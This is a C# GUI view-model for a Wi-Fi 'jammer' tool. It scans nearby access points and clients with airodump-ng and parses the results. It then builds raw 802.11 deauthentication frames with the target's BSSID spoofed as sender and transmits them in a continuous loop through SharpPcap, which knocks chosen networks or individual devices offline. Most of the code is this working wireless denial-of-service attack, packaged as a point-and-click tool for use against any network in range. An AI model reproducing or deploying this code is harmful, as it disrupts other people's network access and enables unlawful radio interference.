using Avalonia.Interactivity;
using Avalonia.Media;
using JammerV1.Models;
using JammerV1.Views;
using JammerV1.Commands;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.Windows.Input;
using System.Globalization;
using System.Threading;
using System;
using Microsoft.VisualBasic.FileIO;
using System.Linq;
using System.Threading.Tasks;
using SharpPcap;
using CliWrap;
using CliWrap.Buffered;
using Microsoft.VisualBasic;
using System.Net.WebSockets;
using System.IO;

namespace JammerV1.ViewModels;

public class MainWindowViewModel : INotifyPropertyChanged
{
    // Constants
    private const string Green = "#2ec04f";
    private const string Red = "#f23f42";


    // Private Variables
    private ObservableCollection<AP> _accessPoints;
    private bool _isScanning;
    private AP _selectedAP;


    // Additional Variables
    public bool IsNotScanning => !IsScanning;
    public List<Client> AllClients { get; set; } = new List<Client>();
    public bool IsAPSelected => SelectedAP != null;

    // Commands
    public ICommand JamCommand { get; }
    public ICommand ScanCommand { get; }
    public ICommand JamClientCommand { get; }

    // Getters and Setters
    public ObservableCollection<AP> AccessPoints
    {
        get => _accessPoints;
        set
        {
            if (_accessPoints != value)
            {
                _accessPoints = value;
                OnPropertyChanged(nameof(AccessPoints));
            }
        }
    }

    public bool IsScanning
    {
        get => _isScanning;
        set
        {
            _isScanning = value;
            OnPropertyChanged();
            OnPropertyChanged(nameof(IsScanning));
        }
    }

    public AP SelectedAP
    {
        get => _selectedAP;
        set
        {
            if (_selectedAP != value)
            {
                _selectedAP = value;
                OnPropertyChanged(nameof(SelectedAP));
                OnPropertyChanged(nameof(IsAPSelected));
            }
        }
    }



    public ICommand ToggleJammingCommand { get; }

    // Constructor - for now, just populate some sample data.
    public MainWindowViewModel()
    {
        // Register commands
        ScanCommand = new RelayCommand(o => ExecuteScan());
        ToggleJammingCommand = new RelayCommand(o => ToggleJamming(o));

        // Instantiate a new observable collection
        AccessPoints = new ObservableCollection<AP>();
    }

    private void JamClient(Client client) {
        Task.Run(async () => {
            // TODO: Error handling for no devices, or permission error, etc.
            var device = CaptureDeviceList.Instance[1];
            device.Open(DeviceModes.Promiscuous);
            // Need to parse the AP BSSID (string -> bytes)
            string[] bssidParts = client.BSSID.Split(":");
            byte[] bssidBytes = new byte[bssidParts.Length];
            for (int i = 0; i < bssidParts.Length; i++)
            {
                bssidBytes[i] = byte.Parse(bssidParts[i], NumberStyles.HexNumber);
            }

            string[] stationMacParts = client.StationMAC.Split(":");
            byte[] stationMacBytes = new byte[stationMacParts.Length];
            for (int i = 0; i < stationMacParts.Length; i++)
            {
                stationMacBytes[i] = byte.Parse(stationMacParts[i], NumberStyles.HexNumber);
            }

            byte[] deauthFrame = new byte[] {
                    0x00, 0x00, 0x0c, 0x00, 0x04, 0x80, 0x00, 0x00, 0x02, 0x00, 0x18, 0x00, // Radiotap header - junk
                    0xc0, // Type / subtype - De-authentication
                    0x00, 0x3a, 0x01, // Duration Garbage
                    stationMacBytes[0], stationMacBytes[1], stationMacBytes[2], stationMacBytes[3], stationMacBytes[4], stationMacBytes[5], // Destination address
                    bssidBytes[0], bssidBytes[1], bssidBytes[2], bssidBytes[3], bssidBytes[4], bssidBytes[5], // Source Address
                    bssidBytes[0], bssidBytes[1], bssidBytes[2], bssidBytes[3], bssidBytes[4], bssidBytes[5], // BSSID (Target AP MAC)
                    0x00, 0x48, // Sequence garbage
                    0x07, 0x00 // Reason - 0x07, 0x00 - Class 3 frame received from nonassociated STA
            };
            try
            {
                while (client.IsJammed)
                {
                    await Task.Delay(100);
                    device.SendPacket(deauthFrame);
                }
            }
            catch (PcapException)
            {

            }
            finally
            {
                device.Close();
            }
        });
    }

    private void JamAP(AP ap)
    {
        // TODO: Should I be instantiating all of this device stuff in both this function and JamClient(), better to do on app start?
        // TODO: Figure out channel switching
        Task.Run(async () => {
            // TODO: Error handling for no devices, or permission error, etc.
            var device = CaptureDeviceList.Instance[1];
            device.Open(DeviceModes.Promiscuous);
            // Need to parse the AP BSSID (string -> bytes)
            string[] parts = ap.BSSID.Split(":");
            byte[] bssidBytes = new byte[parts.Length];
            for (int i = 0; i < parts.Length; i++)
            {
                bssidBytes[i] = byte.Parse(parts[i], NumberStyles.HexNumber);
            }
            byte[] deauthFrame = new byte[] {
                    0x00, 0x00, 0x0c, 0x00, 0x04, 0x80, 0x00, 0x00, 0x02, 0x00, 0x18, 0x00, // Radiotap header - junk
                    0xc0, // Type / subtype - De-authentication
                    0x00, 0x3a, 0x01, // Duration Garbage
                    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination address
                    bssidBytes[0], bssidBytes[1], bssidBytes[2], bssidBytes[3], bssidBytes[4], bssidBytes[5], // Source Address
                    bssidBytes[0], bssidBytes[1], bssidBytes[2], bssidBytes[3], bssidBytes[4], bssidBytes[5], // BSSID (Target AP MAC)
                    0x00, 0x48, // Sequence garbage
                    0x07, 0x00 // Reason - 0x07, 0x00 - Class 3 frame received from nonassociated STA
            };
            try
            {
                while (ap.IsJammed)
                {
                    await Task.Delay(100);
                    device.SendPacket(deauthFrame);
                }
            }
            catch (PcapException) { }
            finally
            {
                device.Close();
            }
        });
    }

    private async void ToggleJamming(object parameter)
    {
        switch (parameter)
        {
            case AP ap:
                ap.IsJammed = !ap.IsJammed;
                if (ap.IsJammed) {
                    JamAP(ap);
                }
                break;
            case Client client:
                client.IsJammed = !client.IsJammed;
                if (client.IsJammed) {
                    JamClient(client);
                }
                break;
        }
    }

    private void ExecuteScan()
    {
        // TODO: Relative paths
        // This happens when the "SCAN" button is pressed
        // First need to clear previous APs and Clients (if any).
        AccessPoints.Clear();
        AllClients.Clear();
        // Begin scanning - TBH the 2000 delay is just for effect right now :D
        IsScanning = true;
        Task.Run(async () =>
        {
            // First, use airodump-ng to get raw output
            using var cancellation_token = new CancellationTokenSource();
            var airodumpCmd = Cli.Wrap("airodump-ng")
                .WithArguments("-a --write-interval 1 -w /home/kali/Desktop/JammerV1/jammer wlan1mon");

            cancellation_token.CancelAfter(TimeSpan.FromSeconds(5));

            // Execute airodump-ng command with handling for cancellation
            try
            {
                await airodumpCmd.ExecuteAsync(cancellation_token.Token);
            }
            catch (OperationCanceledException) { }

            // Define paths for input and output
            string inputFilePath = "/home/kali/Desktop/JammerV1/jammer-01.csv";
            string outputFilePath = "/home/kali/Desktop/JammerV1/jammer-01-cleaned.csv";

            // Now run the sed command to filter output
            try
            {
                var sedCmd = Cli.Wrap("sed")
                    .WithArguments(new[] {
                        "-e", "/^[[:space:]]*$/d",
                        "-e", "/^BSSID/d",  
                        "-e", "/^Station MAC/d",
                        inputFilePath
                    })
                    .WithStandardOutputPipe(PipeTarget.ToFile(outputFilePath));

                var result = await sedCmd.ExecuteBufferedAsync();
                ParseCSV();
                IsScanning = false;
            }
            catch (Exception ex) { }
        });
    }

    private void CleanupJammerFiles() {
        var command = Cli.Wrap("/bin/bash")
            .WithArguments("-c \"rm -f /home/kali/Desktop/JammerV1/jammer-0*\"")
            .ExecuteAsync();
    }

    private void ParseCSV()
    {
        // When testing, there will be a pre-populated CSV, in production will need to handle
        // Generating this. Perhaps using CliWrap.ExecuteAsync with a cancellation token of 10 seconds
        // to "scan" for 10 seconds, then parse as normal.
        try
        {
            using (TextFieldParser parser = new TextFieldParser("/home/kali/Desktop/JammerV1/jammer-01-cleaned.csv"))
            {
                parser.TextFieldType = FieldType.Delimited;
                parser.SetDelimiters(",");
                parser.HasFieldsEnclosedInQuotes = true;
                while (!parser.EndOfData)
                {
                    string[] fields = parser.ReadFields();
                    if (fields.Length == 15)
                    { // APs have 15 length in CSV
                        // Only look for SSIDs that we can get the name of TODO : think aobut this ? should this be so?
                        if (fields[13].Length != 0)
                        {
                            AP ap = new AP
                            {
                                BSSID = fields[0].Trim(),
                                FirstTimeSeen = DateTime.Parse(fields[1].Trim()),
                                LastTimeSeen = DateTime.Parse(fields[2].Trim()),
                                Channel = int.Parse(fields[3].Trim()),
                                Speed = int.Parse(fields[4].Trim()),
                                Privacy = fields[5].Trim(),
                                Cipher = fields[6].Trim(),
                                Authentication = fields[7].Trim(),
                                Power = Math.Abs(int.Parse(fields[8].Trim())),
                                NumberOfBeacons = int.Parse(fields[9].Trim()),
                                NumberOfIV = int.Parse(fields[10].Trim()),
                                LANIP = fields[11].Trim(),
                                IDLength = int.Parse(fields[12].Trim()),
                                ESSID = fields[13].Trim(),
                                Key = fields.Length > 14 ? fields[14].Trim() : string.Empty,  // Handle optional last field
                                Clients = new List<Client>()
                            };
                            AccessPoints.Add(ap);
                        }
                    }
                    else if (fields.Length == 7)
                    {
                        // Here start processing the clients. For now, add them all to a list.
                        // After, I will go through the list and add them to their parent APs
                        // AP.Clients list.
                        Client client = new Client
                        {
                            StationMAC = fields[0],
                            FirstTimeSeen = DateTime.Parse(fields[1]),
                            LastTimeSeen = DateTime.Parse(fields[2]),
                            Power = fields[3],
                            Packets = fields[4],
                            BSSID = fields[5],
                            ProbedESSIDs = fields[6]
                        };
                        AllClients.Add(client);
                    }
                }
            }
            // Here associate the clients with their parents.
            foreach (Client client in AllClients)
            {
                AP parentAp = AccessPoints.Where(x => x.BSSID.Equals(client.BSSID)).FirstOrDefault();
                // ParentAp might be null here.
                // This is because we only add APs that we can get the name of
                // Client devices have BSSIDs of APs that don't exist in our ObservableCollection
                // See TODO further up - this needs rethinking at some point.
                if (parentAp != null) { parentAp.Clients.Add(client); }
            }
            AccessPoints = new ObservableCollection<AP>(AccessPoints.OrderByDescending(ap => ap.Clients.Count));
        }
        catch (System.FormatException) { }
        CleanupJammerFiles();
    }

    public event PropertyChangedEventHandler PropertyChanged;

    protected virtual void OnPropertyChanged([CallerMemberName] string propertyName = null)
    {
        PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
    }

}